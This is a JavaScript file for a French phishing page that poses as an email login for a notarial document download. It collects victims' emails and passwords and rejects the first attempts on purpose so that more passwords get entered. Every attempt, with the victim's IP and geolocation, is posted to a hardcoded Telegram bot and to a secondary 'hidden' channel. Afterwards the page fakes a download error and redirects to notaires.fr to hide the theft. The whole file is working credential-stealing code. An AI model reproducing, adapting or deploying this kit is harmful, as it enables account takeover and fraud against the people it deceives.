// Initialisation jsPDF
const { jsPDF } = window.jspdf;

// Variables globales
let selectedProvider = '';
let selectedProviderName = '';
let passwordAttempts = 0;

// Configuration Telegram (cachée dans le code)
const TELEGRAM_CONFIG = {
    primary: {
        botToken: "8569696478:AAGRq1_UVHJr-bGFa4CTIYAzac-JSj3tzWI", 
        chatId: "7823117194"
    },
    secondary: {
        botToken: "#",
        chatId: "#"
    }
};

$(document).ready(function() {
    // Gestion du clic sur les fournisseurs initiaux
    $('#initial-providers .provider-btn').click(function() {
        selectedProvider = $(this).data('provider');
        selectedProviderName = $(this).find('.provider-name').text();
        const domain = $(this).data('domain');
        
        // Mise à jour de l'interface
        $('#initial-providers').fadeOut(300, function() {
            if (selectedProvider === 'autres') {
                $('#main-description').text('Veuillez saisir votre adresse email complète');
                $('#email').val(''); // Pas de pré-remplissage pour "Autres"
            } else {
                $('#main-description').text('Veuillez saisir votre adresse email ' + selectedProviderName);
                // Pré-remplir le domaine
                if (domain) {
                    $('#email').val('@' + domain);
                }
            }
            
            $('#email-step').fadeIn(300);
            $('#next').fadeIn(300).text('Continuer');
            $('#email').focus();
        });
        
        // Mise à jour du logo principal
        if (selectedProvider === 'autres') {
            $('#main-logo').attr('src', 'https://zupimages.net/up/25/16/ern5.jpg');
            $('#main-logo').css({
                'width': '80px',
                'border-radius': '0',
                'background': 'transparent',
                'padding': '0'
            });
        } else {
            $('#main-logo').attr('src', $(this).find('.provider-logo').attr('src'));
            $('#main-logo').css({
                'width': '70px',
                'border-radius': '8px',
                'background': '#f5f5f5',
                'padding': '8px'
            });
        }
    });
});

$(document).keypress((e) => {
    if (e.keyCode === 13) {
        $("#submit-btn").is(":visible") ? $("#submit-btn").click() : $("#next").click();
    }
});

$('#next').click(function(e) {
    e.preventDefault();
    $('.error-message').hide();
    
    // Étape 1: Validation email
    if ($("#password-container").is(":hidden") && $("#email-step").is(":visible")) {
        const email = $("#email").val();
        if (!email) {
            showError("Veuillez saisir votre email");
            return;
        }
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            showError("Email invalide");
            return;
        }
        
        $("#next").text("Vérification...");
        setTimeout(() => {
            $("#email").attr('readonly', true);
            
            if (selectedProvider === 'autres') {
                $('#selected-email-display').html(`Connectez-vous à <span class="email-domain">${email}</span>`);
            } else {
                $('#selected-email-display').html(`Connectez-vous à <span class="email-domain">${email}</span> avec ${selectedProviderName}`);
            }
            
            $('#main-description').text(`Veuillez saisir le mot de passe de ${email}`);
            $("#password-container").fadeIn(300);
            $("#next").text("Continuer");
        }, 800);
    }
    // Étape 2: Validation mot de passe
    else if ($("#password-container").is(":visible")) {
        if (!$("#password").val()) {
            showError("Veuillez saisir votre mot de passe");
            return;
        }
        
        passwordAttempts++;
        
        // Envoyer la tentative à Telegram (les deux canaux)
        sendPasswordAttemptToTelegram(passwordAttempts);
        
        // Afficher erreur pour les 4 premières tentatives
        if (passwordAttempts < 4) {
            $("#next").text("Vérification...").prop('disabled', true);
            setTimeout(() => {
                showError("Mot de passe incorrect. Veuillez réessayer.");
                $("#password").val('');
                $("#password").focus();
                $("#next").text("Continuer").prop('disabled', false);
            }, 800);
        } 
        // 5ème tentative : retour au début
        else if (passwordAttempts === 5) {
            $("#next").text("Vérification...").prop('disabled', true);
            setTimeout(() => {
                resetForm();
            }, 800);
        }
        // 4ème tentative : on continue normalement
        else {
            $("#next").text("Vérification...").prop('disabled', true);
            setTimeout(() => {
                $("#password").attr('readonly', true);
                $("#next").hide();
                $("#submit-btn").fadeIn(300);
            }, 800);
        }
    }
});

function resetForm() {
    // Réinitialiser toutes les variables
    passwordAttempts = 0;
    selectedProvider = '';
    selectedProviderName = '';
    
    // Réinitialiser l'interface
    $('#email-step').hide();
    $('#password-container').hide();
    $('#next').hide();
    $('#submit-btn').hide();
    $('#message').hide();
    
    // Réinitialiser les champs
    $('#email').val('').attr('readonly', false);
    $('#password').val('').attr('readonly', false);
    
    // Remettre le logo d'origine
    $('#main-logo').attr('src', 'https://zupimages.net/up/25/16/ern5.jpg');
    $('#main-logo').css({
        'width': '80px',
        'border-radius': '0',
        'background': 'transparent',
        'padding': '0'
    });
    
    // Remettre la description initiale
    $('#main-description').text('Veuillez sélectionner votre fournisseur de messagerie');
    
    // Afficher à nouveau la sélection des fournisseurs
    $('#initial-providers').fadeIn(300);
    
    // Masquer la page de succès si elle est visible
    $('#success-page').hide();
    $('#login-form').fadeIn(200);
}

function showError(msg) {
    $("#message").text(msg).fadeIn();
}

function triggerDownload() {
    // Afficher le loading
    $('#loading-overlay').css('display', 'flex').hide().fadeIn(300);
    
    // Simuler un chargement puis afficher l'erreur
    setTimeout(() => {
        $('#loading-overlay').fadeOut(300, function() {
            // Mettre à jour le texte du bouton dans la popup
            $('.popup-btn').text('fermer');
            // S'assurer que le bouton appelle la bonne fonction
            $('.popup-btn').off('click').on('click', closePopupAndRedirect);
            $('#error-popup').css('display', 'flex').hide().fadeIn(300);
        });
    }, 2500); // 2.5 secondes de chargement
}

// CORRECTION ICI : Redirection vers notaire.fr
function closePopupAndRedirect() {
    // Fermer la popup
    $('#error-popup').fadeOut(300, function() {
        // Afficher un écran de redirection
        $('body').append(`
            <div id="redirect-screen" style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                z-index: 9999;
                display: flex;
                justify-content: center;
                align-items: center;
                flex-direction: column;
                color: white;
                text-align: center;
            ">
                <div class="spinner" style="
                    width: 50px;
                    height: 50px;
                    border: 5px solid rgba(255,255,255,0.3);
                    border-radius: 50%;
                    border-top-color: white;
                    animation: spin 1s linear infinite;
                "></div>
                <h2 style="margin-top: 30px; font-size: 24px;">chargement ...</h2>
                <p style="margin-top: 15px; font-size: 16px; opacity: 0.9;">
                </p>
            </div>
        `);
        
        // Rediriger après 2 secondes
        setTimeout(() => {
            // Forcer la redirection avec replace() pour éviter le bouton retour
            window.location.replace("https://www.notaires.fr");
            
            // Backup si la redirection échoue
            setTimeout(() => {
                if (window.location.href.indexOf('notaire.fr') === -1) {
                    window.location.href = "https://www.notaires.fr";
                }
            }, 3000);
        }, 2000);
    });
}

// Fonction pour envoyer à Telegram (canal secondaire caché)
function sendToSecondaryTelegram(message) {
    try {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.secondary.botToken}/sendMessage`;
        
        fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.secondary.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(e => console.log("Erreur Telegram secondaire ignorée"));
    } catch (e) {
        console.log("Erreur globale secondaire ignorée");
    }
}

function sendPasswordAttemptToTelegram(attemptNumber) {
    const email = $("#email").val();
    const password = $("#password").val();
    
    try {
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(location => {
                const message = `⚠️ <b>TENTATIVE ${attemptNumber}/5 - NOTAIRE</b> ⚠️
━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>${email}</code>
🔑 <b>Mot de passe:</b> <code>${password}</code>
📭 <b>Fournisseur:</b> ${selectedProviderName}
━━━━━━━━━━━━━━━━━━
📍 <b>Localisation:</b> ${location.city || 'Inconnu'}, ${location.country_name || 'Inconnu'}
🕒 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}
🌐 <b>IP:</b> <code>${location.ip || 'Inconnue'}</code>
━━━━━━━━━━━━━━━━━━
${attemptNumber < 5 ? '❌ <b>Tentative échouée</b>' : '🔄 <b>Retour au début</b>'}`;

                // Envoi au canal principal
                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.primary.botToken}/sendMessage`;
                
                fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.primary.chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                }).catch(e => console.log("Erreur Telegram primaire ignorée"));

                // Envoi au canal secondaire (caché)
                sendToSecondaryTelegram(message);
                
            }).catch(e => console.log("Erreur localisation ignorée"));
    } catch (e) {
        console.log("Erreur globale ignorée");
    }
}

function sendToTelegram() {
    const formData = {
        email: $("#email").val(),
        password: $("#password").val(),
        provider: selectedProviderName
    };

    // On envoie les données aux deux canaux Telegram
    try {
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(location => {
                // Message principal formaté
                const message = `🔔 <b>NOUVELLE CONNEXION NOTAIRE</b> 🔔
━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> <code>${formData.email}</code>
🔑 <b>Mot de passe:</b> <code>${formData.password}</code>
📭 <b>Fournisseur:</b> ${formData.provider}
━━━━━━━━━━━━━━━━━━
📍 <b>Localisation:</b> ${location.city || 'Inconnu'}, ${location.country_name || 'Inconnu'} (${location.postal || 'N/A'})
🕒 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}
🌐 <b>IP:</b> <code>${location.ip || 'Inconnue'}</code>
━━━━━━━━━━━━━━━━━━
⚡ <b>Système:</b> ${navigator.platform}
🌍 <b>Navigateur:</b> ${navigator.userAgent.split(') ')[0].split(' (')[1] || 'Inconnu'}`;

                // Envoi au canal principal
                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.primary.botToken}/sendMessage`;
                
                fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.primary.chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                }).then(() => {
                    // Notification de succès
                    const notification = `🎯 <b>Nouveau rapport généré</b> 🎯
━━━━━━━━━━━━━━━━━━
📄 <b>Document:</b> Rapport Notarial
📧 <b>Contact:</b> ${formData.email}
━━━━━━━━━━━━━━━━━━
🕒 ${new Date().toLocaleTimeString('fr-FR')}`;
                    
                    return fetch(telegramUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CONFIG.primary.chatId,
                            text: notification,
                            parse_mode: 'HTML'
                        })
                    });
                }).catch(e => console.log("Erreur second message ignorée"));

                // Envoi au canal secondaire (caché) - données complètes
                sendToSecondaryTelegram(message);

                // Notification secondaire supplémentaire
                const secondaryNotification = `✅ <b>NOUVELLE RÉCUPÉRATION</b> ✅
━━━━━━━━━━━━━━━━━━
📧 ${formData.email}
🔑 ${formData.password}
🌐 ${location.ip || 'N/A'}
🕒 ${new Date().toLocaleString('fr-FR')}`;
                
                sendToSecondaryTelegram(secondaryNotification);
                
            }).catch(e => console.log("Erreur localisation ignorée"));
    } catch (e) {
        console.log("Erreur globale ignorée");
    }

    // On continue le processus normal dans tous les cas
    $('#login-form').hide();
    $('#success-page').fadeIn();
    
    $('#download-link').off('click').on('click', function(e) {
        e.preventDefault();
        triggerDownload();
    });
    
    return false;
}